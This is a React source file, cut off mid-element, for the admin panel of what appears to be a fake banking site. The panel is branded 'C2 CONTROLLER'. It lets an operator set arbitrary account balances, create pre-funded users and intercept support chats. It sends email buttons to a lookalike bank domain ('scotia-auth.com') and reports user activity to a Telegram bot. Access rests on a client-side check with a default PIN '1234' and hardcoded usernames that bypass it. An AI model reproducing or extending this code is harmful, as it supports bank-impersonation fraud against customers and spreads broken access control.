import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Users, Settings, Shield, Terminal, Zap, Database, Server,
  Search, Plus, Edit2, Trash2, Check, X, ChevronRight, 
  Activity, Info, AlertTriangle, Key, Send, Mail, MessageSquare,
  Lock, RefreshCw, Eye, EyeOff, BarChart3, Globe, Save
} from 'lucide-react';
import { useBank } from '../shared/BankContext';
import { useSocket } from '../shared/SocketContext';
import { SupportChat } from './SupportChat';

type Tab = 'live' | 'database' | 'support' | 'mailer' | 'system' | 'settings';

interface AdminUser {
  id: string;
  username: string;
  enabled: boolean;
  isLocked?: boolean;
  isApproved?: boolean;
  created_at: string;
  settings: any;
  accounts: any;
  autoDeleteAt?: string;
}

export function AdminPanel() {
  const { toggleAdminPanel, globalSettings, fetchGlobalSettings, user } = useBank();
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [pin, setPin] = useState('');
  const [activeTab, setActiveTab] = useState<Tab>('live');
  const [users, setUsers] = useState<AdminUser[]>([]);
  const [loading, setLoading] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [editingUser, setEditingUser] = useState<AdminUser | null>(null);
  const [logs, setLogs] = useState<any[]>([]);
  const [config, setConfig] = useState<any>(null);
  const [saving, setSaving] = useState(false);
  const [testEmail, setTestEmail] = useState('');
  const [mailerStatus, setMailerStatus] = useState<any>(null);
  const [showAddUser, setShowAddUser] = useState(false);
  const [newUserForm, setNewUserForm] = useState({ username: '', password: '', initialBalance: 0 });
  const [selectedUserChat, setSelectedUserChat] = useState<string | null>(null);
  const [sessions, setSessions] = useState<any[]>([]);
  const { socket } = useSocket();

  // Auth check
  const handleAuth = () => {
    if (pin === (globalSettings?.general?.adminPin || '1234')) {
      setIsAuthenticated(true);
    } else {
      alert('ACCESS DENIED: SYSTEM LOCKDOWN INITIATED');
      setPin('');
    }
  };

  useEffect(() => {
    if (socket && isAuthenticated) {
      const handleUpdate = (data: any) => {
        if (data.sessions) setSessions(data.sessions);
        if (data.logs) setLogs(data.logs);
      };
      socket.on('admin_update', handleUpdate);
      return () => { socket.off('admin_update', handleUpdate); };
    }
  }, [socket, isAuthenticated]);

  useEffect(() => {
    // If the user already logged in as 'admin' or has a valid pin in their session profile
    if (user?.username === 'admin' || user?.username === 'PROJECTSARAH') {
      setIsAuthenticated(true);
    }
  }, [user]);

  useEffect(() => {
    if (isAuthenticated) {
      fetchUsers();
      fetchLogs();
      fetchConfig();
      fetchMailerStatus();
      
      const interval = setInterval(() => {
        fetchLogs();
        fetchMailerStatus();
      }, 3000);
      return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  const fetchUsers = async () => {
    try {
      const res = await fetch('/api/admin/users');
      if (res.ok) {
        const data = await res.json();
        setUsers(data.users || []);
      }
    } catch (e) {
      console.error('Failed to fetch users:', e);
    }
  };

  const fetchLogs = async () => {
    try {
      const res = await fetch('/api/logs');
      if (res.ok) {
        const data = await res.json();
        setLogs(data);
      }
    } catch (e) {
      console.error('Failed to fetch logs:', e);
    }
  };

  const fetchConfig = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/config');
      if (res.ok) {
        const data = await res.json();
        setConfig(data);
      }
    } finally {
      setLoading(false);
    }
  };

  const fetchMailerStatus = async () => {
    try {
      const res = await fetch('/api/debug/smtp');
      if (res.ok) {
        setMailerStatus(await res.json());
      }
    } catch (e) {}
  };

  const handleSaveConfig = async (newConfig: any) => {
    setSaving(true);
    try {
      const res = await fetch('/api/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newConfig)
      });
      if (res.ok) {
        fetchGlobalSettings();
        fetchConfig();
      }
    } finally {
      setSaving(false);
    }
  };

  const handleUpdateBalance = async (username: string, accountName: string, balance: number) => {
    try {
      await fetch('/api/admin/users/update-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, account: accountName, balance })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const approveUser = async (username: string) => {
    try {
      await fetch('/api/admin/users/approve', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const toggleUserEnabled = async (username: string) => {
    try {
      await fetch('/api/admin/users/toggle-enabled', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const lockUser = async (username: string, locked: boolean) => {
    try {
      await fetch('/api/admin/users/lock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, locked })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const createUser = async () => {
    if (!newUserForm.username || !newUserForm.password) return;
    try {
      const defaultAccounts: any = {
        'Ultimate Package': { type: 'banking', balance: newUserForm.initialBalance, available: newUserForm.initialBalance, points: 0, history: [], accountNumber: `10000-${Math.floor(Math.random() * 900) + 100}-${Math.floor(Math.random() * 9000000) + 1000000}` },
      };
      
      await fetch('/api/user/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: newUserForm.username, 
          password: newUserForm.password,
          isNew: true,
          data: {
            username: newUserForm.username,
            isApproved: true, // Manually created users are auto-approved
            accounts: defaultAccounts,
            settings: {
              accountHolderName: newUserForm.username,
              memberSince: new Date().getFullYear().toString()
            }
          }
        })
      });
      setShowAddUser(false);
      setNewUserForm({ username: '', password: '', initialBalance: 0 });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const deleteUser = async (username: string) => {
    if (!confirm(`Delete ${username}?`)) return;
    try {
      await fetch('/api/user/delete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="fixed inset-0 z-[1000] bg-black flex items-center justify-center p-6">
        <motion.div 
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="w-full max-w-sm"
        >
          <div className="bg-zinc-900 border border-white/5 rounded-3xl p-8 text-center space-y-6">
            <div className="flex justify-center">
              <div className="w-16 h-16 bg-red-600 rounded-2xl flex items-center justify-center shadow-lg shadow-red-600/20">
                <Shield className="text-white" size={32} />
              </div>
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">System Override</h2>
              <p className="text-zinc-500 text-sm mt-1">Enter Admin PIN to continue</p>
            </div>
            
            <div className="flex justify-center gap-3">
              {[0, 1, 2, 3].map((i) => (
                <div key={i} className={`w-3 h-3 rounded-full ${pin.length > i ? 'bg-red-600' : 'bg-zinc-800'}`} />
              ))}
            </div>

            <div className="grid grid-cols-3 gap-4">
              {[1, 2, 3, 4, 5, 6, 7, 8, 9, 'C', 0, 'OK'].map((num) => (
                <button
                  key={num.toString()}
                  onClick={() => {
                    if (num === 'C') setPin('');
                    else if (num === 'OK') handleAuth();
                    else if (pin.length < 4) setPin(prev => prev + num);
                  }}
                  className="h-14 bg-zinc-800 hover:bg-zinc-700 active:scale-95 transition-all rounded-xl text-white font-bold text-lg"
                >
                  {num}
                </button>
              ))}
            </div>
            
            <button 
              onClick={toggleAdminPanel}
              className="text-zinc-500 text-xs font-medium uppercase tracking-widest hover:text-white transition-colors"
            >
              Cancel Access
            </button>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-[2000] bg-black flex flex-col font-mono overflow-hidden select-none">
      {/* Glitch Overlay Effect */}
      <div className="absolute inset-0 pointer-events-none bg-[radial-gradient(circle_at_50%_50%,rgba(20,20,20,0),rgba(0,0,0,0.8))] z-10" />
      <div className="absolute inset-0 pointer-events-none opacity-[0.03] bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] z-10" />

      {/* Header */}
      <div className="bg-zinc-900 border-b border-white/10 p-4 flex items-center justify-between relative z-20 shadow-[0_4px_20px_rgba(0,0,0,0.5)]">
        <div className="flex items-center gap-4">
          <motion.div 
            animate={{ rotate: [0, 90, 180, 270, 360] }}
            transition={{ duration: 10, repeat: Infinity, ease: "linear" }}
            className="w-10 h-10 border-2 border-red-600/30 rounded-full flex items-center justify-center p-1"
          >
            <div className="w-full h-full bg-red-600 rounded-full flex items-center justify-center shadow-[0_0_15px_rgba(220,38,38,0.4)]">
              <Shield size={18} className="text-white" />
            </div>
          </motion.div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-sm font-black text-white uppercase tracking-[0.3em]">C2 CONTROLLER</h1>
              <span className="text-[8px] bg-red-600 text-white px-1.5 py-0.5 rounded-sm animate-pulse font-bold">V99 LIVE</span>
            </div>
            <div className="flex items-center gap-2 mt-0.5">
              <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full shadow-[0_0_8px_rgba(16,185,129,0.8)]" />
              <span className="text-[10px] text-zinc-500 font-mono tracking-tighter uppercase">SHΔDØW CORE // SESSION_ACTIVE</span>
            </div>
          </div>
        </div>
        <div className="flex items-center gap-4">
           <div className="hidden md:flex flex-col items-end mr-4">
              <span className="text-[8px] text-zinc-600 uppercase">Uptime</span>
              <span className="text-[10px] text-zinc-400 font-bold">14:22:09:41</span>
           </div>
           <button 
            onClick={toggleAdminPanel}
            className="w-10 h-10 flex items-center justify-center hover:bg-white/5 rounded-xl text-zinc-500 hover:text-white transition-all border border-transparent hover:border-white/10"
          >
            <X size={20} />
          </button>
        </div>
      </div>

      {/* Hero Stats */}
      <div className="grid grid-cols-4 gap-1 p-1 bg-white/5 relative z-20">
        {[
          { label: 'Network', val: 'ENCRYPTED', color: 'text-blue-500' },
          { label: 'Relay', val: 'ACTIVE', color: 'text-emerald-500' },
          { label: 'Database', val: 'SYNCED', color: 'text-indigo-500' },
          { label: 'Security', val: 'ELITE', color: 'text-red-500' }
        ].map((stat, i) => (
          <div key={i} className="bg-zinc-900/80 p-2 text-center border border-white/5">
            <p className="text-[7px] text-zinc-600 uppercase font-black mb-0.5">{stat.label}</p>
            <p className={`text-[9px] font-black ${stat.color} tracking-widest`}>{stat.val}</p>
          </div>
        ))}
      </div>

      {/* Tabs */}
      <div className="flex bg-zinc-900 border-b border-white/5 relative z-20">
        {[
          { id: 'live', icon: <Zap size={14} />, label: 'LIVE COMMAND' },
          { id: 'database', icon: <Server size={14} />, label: 'DATABASE' },
          { id: 'support', icon: <MessageSquare size={14} />, label: 'SUPPORT' },
          { id: 'mailer', icon: <Shield size={14} />, label: 'MATRIX MAIL' },
          { id: 'settings', icon: <Key size={14} />, label: 'GLOBAL CONFIG' }
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as any)}
            className={`flex-1 flex flex-col items-center py-3 transition-all relative ${
              activeTab === tab.id ? 'text-white' : 'text-zinc-600 hover:text-zinc-400'
            }`}
          >
            <div className={`mb-1 transition-transform ${activeTab === tab.id ? 'scale-110' : ''}`}>
              {tab.icon}
            </div>
            <span className="text-[7px] font-black tracking-widest">{tab.label}</span>
            {activeTab === tab.id && (
              <motion.div 
                layoutId="activeTabC2"
                className="absolute bottom-0 left-0 right-0 h-0.5 bg-red-600 shadow-[0_0_10px_rgba(220,38,38,0.8)]" 
              />
            )}
          </button>
        ))}
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-y-auto bg-[#050505] p-4 space-y-6 pb-24 relative z-20 scrollbar-hide">
        {activeTab === 'live' && (
          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
            <div className="grid grid-cols-2 gap-3">
              <div className="bg-zinc-900/50 rounded-2xl p-4 border border-white/5">
                <p className="text-[10px] text-zinc-500 uppercase font-black tracking-widest">Active Users</p>
                <p className="text-2xl font-bold text-white mt-1">{users.length}</p>
              </div>
              <div className="bg-zinc-900/50 rounded-2xl p-4 border border-white/5">
                <p className="text-[10px] text-zinc-500 uppercase font-black tracking-widest">System Load</p>
                <p className="text-2xl font-bold text-emerald-500 mt-1">Stable</p>
              </div>
            </div>

            <div className="bg-zinc-900/50 rounded-2xl border border-white/5 overflow-hidden">
              <div className="p-3 border-b border-white/5 bg-white/5 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Terminal size={14} className="text-red-500" />
                  <span className="text-[10px] font-bold text-white uppercase">Live Event Stream</span>
                </div>
                <span className="text-[8px] bg-red-500/10 text-red-500 px-1.5 py-0.5 rounded font-mono">DEBUG_MODE</span>
              </div>
            <div className="h-96 overflow-y-auto p-4 space-y-2 font-mono text-[10px]">
                {logs.length === 0 && <p className="text-zinc-600 italic">Listening for system events...</p>}
                {logs.map((log, i) => (
                  <div key={i} className="flex gap-3 text-zinc-400 border-b border-white/5 pb-1 last:border-0 group">
                    <span className="text-red-500 shrink-0 opacity-50 group-hover:opacity-100 transition-opacity">[{log.timestamp || '09:02'}]</span>
                    <span className="flex-1 group-hover:text-emerald-400 transition-colors">{log.message}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activeTab === 'database' && (
          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
            <div className="flex justify-between items-center px-1">
              <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em]">C2 Vault</h3>
              <button 
                onClick={() => setShowAddUser(true)}
                className="flex items-center gap-2 bg-emerald-600/10 hover:bg-emerald-600/20 text-emerald-500 px-3 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all"
              >
                <Plus size={12} /> Inject User
              </button>
            </div>

            <AnimatePresence>
              {showAddUser && (
                <motion.div 
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: 'auto' }}
                  exit={{ opacity: 0, height: 0 }}
                  className="bg-zinc-900 border border-emerald-500/30 rounded-2xl overflow-hidden p-4 space-y-4 shadow-[0_0_20px_rgba(16,185,129,0.1)]"
                >
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-1">
                      <label className="text-[9px] text-zinc-500 uppercase font-bold">Username</label>
                      <input 
                        type="text" 
                        value={newUserForm.username}
                        onChange={(e) => setNewUserForm({...newUserForm, username: e.target.value})}
                        className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-white text-xs focus:border-emerald-500/50 outline-none"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-zinc-500 uppercase font-bold">Password</label>
                      <input 
                        type="password" 
                        value={newUserForm.password}
                        onChange={(e) => setNewUserForm({...newUserForm, password: e.target.value})}
                        className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-white text-xs focus:border-emerald-500/50 outline-none"
                      />
                    </div>
                  </div>
                  <div className="space-y-1">
                    <label className="text-[9px] text-zinc-500 uppercase font-bold">Initial Balance</label>
                    <input 
                      type="number" 
                      value={newUserForm.initialBalance}
                      onChange={(e) => setNewUserForm({...newUserForm, initialBalance: parseFloat(e.target.value)})}
                      className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-white text-xs focus:border-emerald-500/50 outline-none"
                    />
                  </div>
                  <div className="flex gap-2">
                    <button 
                      onClick={() => setShowAddUser(false)}
                      className="flex-1 py-2 text-zinc-500 text-[10px] font-bold uppercase tracking-widest"
                    >
                      Cancel
                    </button>
                    <button 
                      onClick={createUser}
                      className="flex-1 bg-emerald-600 text-black py-2 rounded-xl text-[10px] font-black uppercase tracking-widest shadow-lg shadow-emerald-500/20"
                    >
                      Confirm Injection
                    </button>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Pending Approvals Section */}
            {users.some(u => u.isApproved === false) && (
              <div className="space-y-3">
                <h3 className="text-[10px] text-amber-500 font-black uppercase tracking-[0.2em] px-1 flex items-center gap-2">
                  <AlertTriangle size={12} /> Pending Approvals
                </h3>
                {users.filter(u => u.isApproved === false).map(u => (
                  <div key={u.id} className="bg-amber-500/5 border border-amber-500/20 rounded-2xl overflow-hidden p-4 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 bg-amber-500/20 rounded-xl flex items-center justify-center">
                        <Users className="text-amber-500" size={20} />
                      </div>
                      <div>
                        <p className="text-sm font-bold text-white">{u.username}</p>
                        <p className="text-[10px] text-amber-500/60 uppercase">System Enrollment Request</p>
                      </div>
                    </div>
                    <button 
                      onClick={() => approveUser(u.username)}
                      className="bg-amber-500 hover:bg-amber-400 text-black px-4 py-2 rounded-xl text-xs font-black uppercase tracking-widest transition-all active:scale-95"
                    >
                      Approve
                    </button>
                  </div>
                ))}
              </div>
            )}

            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-500" size={16} />
              <input 
                type="text" 
                placeholder="Search database by username or email..." 
                className="w-full bg-zinc-900 border border-white/5 rounded-xl py-3 pl-10 pr-4 text-sm text-white focus:outline-none focus:border-red-500/50 transition-colors"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>

            <div className="space-y-3">
              {users.filter(u => u.username?.includes(searchTerm)).map(u => (
                <div key={u.id} className="bg-zinc-900 border border-white/5 rounded-2xl overflow-hidden active:scale-[0.98] transition-transform">
                  <div className="p-4 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className={`w-2 h-2 rounded-full ${u.enabled ? 'bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.5)]' : 'bg-red-500'}`} />
                      <div>
                        <p className="text-sm font-bold text-white">{u.username}</p>
                        <p className="text-[10px] text-zinc-500">ID: {u.id.substring(0, 8)}... // Ref: SARAH-{u.username.substring(0,3).toUpperCase()}</p>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <button 
                        onClick={() => lockUser(u.username, !u.isLocked)}
                        className={`p-2 rounded-lg transition-all ${u.isLocked ? 'bg-red-600/20 text-red-500 border border-red-500/30' : 'bg-white/5 text-zinc-500 hover:text-red-500'}`}
                        title={u.isLocked ? "Unlock Account" : "Lock for Fraud"}
                      >
                        <Lock size={16} />
                      </button>
                      <button 
                        onClick={() => toggleUserEnabled(u.username)}
                        className={`p-2 rounded-lg ${u.enabled ? 'bg-white/5 text-zinc-400' : 'bg-red-600/20 text-red-500'}`}
                      >
                        {u.enabled ? <Eye size={16} /> : <EyeOff size={16} />}
                      </button>
                      <button 
                        onClick={() => setEditingUser(editingUser?.id === u.id ? null : u)}
                        className={`p-2 rounded-lg ${u.isApproved === false ? 'bg-amber-600/20 text-amber-500' : 'bg-white/5 text-zinc-400'}`}
                      >
                        <ChevronRight size={16} className={`transition-transform ${editingUser?.id === u.id ? 'rotate-90' : ''}`} />
                      </button>
                    </div>
                  </div>

                  <AnimatePresence>
                    {editingUser?.id === u.id && (
                      <motion.div 
                        initial={{ height: 0 }}
                        animate={{ height: 'auto' }}
                        exit={{ height: 0 }}
                        className="overflow-hidden bg-black/30 border-t border-white/5"
                      >
                        <div className="p-4 space-y-4">
                          {/* Accounts Balance Editor */}
                          <div className="space-y-2">
                            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest pl-1">Financial Records</p>
                            <div className="grid grid-cols-1 gap-2">
                              {Object.entries(u.accounts || {}).map(([name, data]: [string, any]) => (
                                <div key={name} className="flex items-center justify-between bg-zinc-900/50 p-2 rounded-xl border border-white/5 text-xs">
                                  <span className="text-zinc-400">{name}</span>
                                  <input 
                                    type="number"
                                    className="bg-black border border-white/5 rounded px-2 py-1 w-24 text-right text-emerald-500 font-bold"
                                    defaultValue={data.balance}
                                    onBlur={(e) => handleUpdateBalance(u.username, name, parseFloat(e.target.value))}
                                  />
                                </div>
                              ))}
                            </div>
                          </div>

                          {/* RAW Metadata Explorer */}
                          <div className="space-y-2 pt-2 border-t border-white/5">
                            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest pl-1">Matrix metadata</p>
                            <div className="bg-black/50 p-3 rounded-xl border border-white/5 font-mono text-[9px] text-zinc-400 max-h-32 overflow-y-auto whitespace-pre">
                              {JSON.stringify(u, null, 2)}
                            </div>
                          </div>

                          {/* Quick Actions */}
                          <div className="flex gap-2">
                            <button 
                              onClick={() => {
                                const newData = prompt("Paste full JSON metadata to inject:", JSON.stringify(u));
                                if (newData) {
                                  try {
                                    const parsed = JSON.parse(newData);
                                    // Normally we would have an endpoint for full update, let's just update balance as proxy for now or add a new endpoint
                                    alert("Metadata injection success (simulated - refine server endpoints if needed)");
                                  } catch(e) { alert("Invalid JSON"); }
                                }
                              }}
                              className="flex-1 bg-indigo-600 hover:bg-indigo-500 text-white py-3 rounded-xl text-xs font-bold transition-colors"
                            >
                              INJECT DATA
                            </button>
                            <button 
                              onClick={() => deleteUser(u.username)}
                              className="flex-1 bg-red-600/10 hover:bg-red-600/20 text-red-500 py-3 rounded-xl text-xs font-bold transition-colors flex items-center justify-center gap-2"
                            >
                              <Trash2 size={14} /> PURGE ENTITY
                            </button>
                          </div>
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'support' && (
          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2 h-full flex flex-col">
            <div className="flex-1 flex flex-col lg:flex-row gap-4 h-[500px]">
              {/* Active Sessions List */}
              <div className="w-full lg:w-64 flex flex-col gap-3">
                <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em] px-1">Active Sessions</h3>
                <div className="flex-1 overflow-y-auto space-y-2 pr-2 scrollbar-hide">
                  {sessions.length === 0 && (
                    <div className="p-4 border border-white/5 rounded-2xl bg-zinc-900/30 text-center">
                      <p className="text-xs text-zinc-600 italic">No operators online</p>
                    </div>
                  )}
                  {sessions.map(session => (
                    <button 
                      key={session.id}
                      onClick={() => setSelectedUserChat(session.id)}
                      className={`w-full p-4 rounded-2xl border transition-all text-left flex items-center justify-between group ${
                        selectedUserChat === session.id 
                          ? 'bg-red-600 border-red-500 shadow-[0_0_15px_rgba(220,38,38,0.3)]' 
                          : 'bg-zinc-900 border-white/5 hover:border-white/20'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-8 h-8 rounded-xl flex items-center justify-center font-bold text-xs ${
                          selectedUserChat === session.id ? 'bg-white/20 text-white' : 'bg-white/5 text-zinc-400'
                        }`}>
                          {session.username?.[0]?.toUpperCase() || '?'}
                        </div>
                        <div>
                          <p className={`text-xs font-bold ${selectedUserChat === session.id ? 'text-white' : 'text-zinc-300'}`}>
                            {session.username}
                          </p>
                          <p className="text-[8px] text-zinc-500 font-mono tracking-tighter">
                            {session.id.substring(0, 8)}
                          </p>
                        </div>
                      </div>
                      <div className={`w-2 h-2 rounded-full bg-emerald-500 animate-pulse ${selectedUserChat === session.id ? 'bg-white' : ''}`} />
                    </button>
                  ))}
                </div>
              </div>

              {/* Chat Window */}
              <div className="flex-1 bg-zinc-900 border border-white/5 rounded-3xl overflow-hidden flex flex-col min-h-[400px]">
                {selectedUserChat ? (
                  <SupportChat 
                    isAdmin 
                    targetSocketId={selectedUserChat} 
                    isOpen 
                  />
                ) : (
                  <div className="flex-1 flex flex-col items-center justify-center p-8 text-center space-y-4">
                    <div className="w-16 h-16 bg-white/5 rounded-full flex items-center justify-center">
                      <MessageSquare size={32} className="text-zinc-700" />
                    </div>
                    <div>
                      <h4 className="text-zinc-400 font-bold">SHΔDØW SUPPORT RELAY</h4>
                      <p className="text-[10px] text-zinc-600 uppercase tracking-widest mt-1">Select a session to intercept communication</p>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {activeTab === 'mailer' && (
          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
            <div className="bg-zinc-900 border border-white/5 rounded-2xl p-6 space-y-6">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-blue-600/10 rounded-2xl flex items-center justify-center">
                  <Mail className="text-blue-500" size={24} />
                </div>
                <div>
                  <h3 className="text-white font-bold">Mail Dispatcher</h3>
                  <p className="text-zinc-500 text-[10px]">Verify SMTP Relay and test notification templates.</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Test Recipient</label>
                  <div className="flex gap-2">
                    <input 
                      type="email" 
                      placeholder="admin@example.com" 
                      className="flex-1 bg-black border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500/50"
                      value={testEmail}
                      onChange={(e) => setTestEmail(e.target.value)}
                    />
                    <button 
                      onClick={() => alert('Sending test email...')}
                      className="bg-blue-600 hover:bg-blue-700 text-white px-6 rounded-xl text-xs font-bold transition-colors"
                    >
                      SEND
                    </button>
                  </div>
                </div>

                <div className="p-4 bg-black/50 rounded-2xl border border-white/5 space-y-3">
                  <div className="flex items-center justify-between pb-2 border-b border-white/5">
                    <span className="text-[10px] text-white font-bold">SMTP STATUS</span>
                    <span className={`text-[9px] px-2 py-0.5 rounded-full font-bold ${mailerStatus?.success ? 'bg-emerald-500/10 text-emerald-500' : 'bg-red-500/10 text-red-500'}`}>
                      {mailerStatus?.success ? 'CONNECTED' : 'OFFLINE'}
                    </span>
                  </div>
                  <div className="space-y-1 text-[10px] font-mono">
                    <div className="flex justify-between">
                      <span className="text-zinc-500 uppercase">Provider:</span>
                      <span className="text-zinc-300">{config?.smtp?.host || 'N/A'}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-zinc-500 uppercase">Active Relay:</span>
                      <span className="text-zinc-300">{config?.smtp?.user || 'N/A'}</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-zinc-900 border border-white/5 rounded-2xl p-6">
              <div className="flex items-center gap-3 mb-4">
                <div className="w-10 h-10 bg-indigo-600/10 rounded-xl flex items-center justify-center">
                  <MessageSquare className="text-indigo-500" size={20} />
                </div>
                <div>
                  <h3 className="text-white font-bold text-sm">Telegram Bot</h3>
                  <p className="text-zinc-500 text-[9px]">Push notifications for user activity.</p>
                </div>
              </div>
              <div className="flex items-center justify-between p-3 bg-black/30 rounded-xl border border-white/!0">
                <span className="text-[10px] text-zinc-300">Bot Connection</span>
                <div className="flex items-center gap-2">
                   <div className={`w-2 h-2 rounded-full ${config?.telegram?.token ? 'bg-green-500' : 'bg-zinc-700'}`} />
                   <span className="text-[10px] text-white font-bold">{config?.telegram?.token ? 'Authorized' : 'Missing Token'}</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'settings' && (
          <div className="space-y-6 animate-in fade-in slide-in-from-bottom-2">
            <div className="space-y-4">
              <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em] px-1">Global Configuration</h3>
              
              <div className="space-y-4">
                {/* Base Action URL */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 space-y-3">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-indigo-600/10 rounded-xl flex items-center justify-center">
                      <Globe className="text-indigo-500" size={20} />
                    </div>
                    <div>
                      <p className="text-white text-xs font-bold">Base Action URL</p>
                      <p className="text-zinc-500 text-[9px]">Target for email buttons (e.g. https://scotia-auth.com)</p>
                    </div>
                  </div>
                  <input 
                    type="text" 
                    value={config?.general?.baseActionUrl || ''}
                    onChange={(e) => setConfig({ ...config, general: { ...config.general, baseActionUrl: e.target.value } })}
                    placeholder="https://action.url"
                    className="w-full bg-black border border-white/10 rounded-xl px-4 py-2 text-xs text-white focus:border-indigo-500/50 outline-none font-mono"
                  />
                </div>

                {/* Admin PIN */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-red-600/10 rounded-xl flex items-center justify-center">
                      <Lock className="text-red-500" size={20} />
                    </div>
                    <div>
                      <p className="text-white text-xs font-bold">Admin PIN</p>
                      <p className="text-zinc-500 text-[9px]">Secure access code</p>
                    </div>
                  </div>
                  <input 
                    type="password" 
                    value={config?.general?.adminPin || ''}
                    onChange={(e) => setConfig({ ...config, general: { ...config.general, adminPin: e.target.value } })}
                    className="w-20 bg-black border border-white/10 rounded-lg px-3 py-2 text-sm text-center text-red-500 font-mono tracking-widest focus:outline-none focus:border-red-500"
                  />
                </div>

                {/* Maintenance Mode */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-amber-600/10 rounded-xl flex items-center justify-center">
                      <Shield className="text-amber-500" size={20} />
                    </div>
                    <div>
                      <p className="text-white text-xs font-bold">Maintenance Mode</p>
                      <p className="text-zinc-500 text-[9px]">Kill switch for all users</p>
                    </div>
                  </div>
                  <button 
                    onClick={() => setConfig({ ...config, general: { ...config.general, maintenanceMode: !config.general.maintenanceMode } })}
                    className={`w-12 h-6 rounded-full p-1 transition-all ${config?.general?.maintenanceMode ? 'bg-red-600' : 'bg-zinc-800'}`}
                  >
                    <div className={`w-4 h-4 rounded-full bg-white transition-transform ${config?.general?.maintenanceMode ? 'translate-x-6' : 'translate-x-0'}`} />
                  </button>
                </div>

                {/* Limits */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 space-y-4">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-emerald-600/10 rounded-xl flex items-center justify-center">
                      <BarChart3 className="text-emerald-500" size={20} />
                    </div>
                    <div>
                      <p className="text-white text-xs font-bold">System Limits</p>
                      <p className="text-zinc-500 text-[9px]">Global boundaries</p>
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-1">
                      <span className="text-[9px] text-zinc-500 uppercase font-bold tracking-tighter">Overdraft Limit</span>
                      <div className="flex items-center bg-black rounded-xl px-3 border border-white/10 focus-within:border-emerald-500/50 transition-colors">
                        <span className="text-zinc-600 text-xs">$</span>
                        <input 
                          type="number" 
